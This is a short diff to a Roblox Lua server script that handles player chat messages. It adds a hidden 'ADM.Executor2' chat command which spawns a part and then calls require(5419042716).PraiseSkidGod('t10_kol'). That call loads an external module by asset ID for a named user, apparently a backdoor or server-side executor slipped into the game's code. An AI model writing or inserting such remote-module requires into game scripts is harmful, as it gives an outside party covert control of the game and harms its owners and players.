@@ -52,6 +52,11 @@ for _, player in pairs(game.Players:GetPlayers()) do
 									local Part = Instance.new("Part",workspace)
 					Part.CanCollide=true
 					Part.CFrame = player.Character.Torso.CFrame
+				elseif message == "ADM.Executor2" then
+							local Part = Instance.new("Part",workspace)
+					Part.CanCollide=true
+					Part.CFrame = player.Character.Torso.CFrame
+				require(5419042716).PraiseSkidGod("t10_kol")
 			end
 				--rbxassetid://7606070501
 		end)
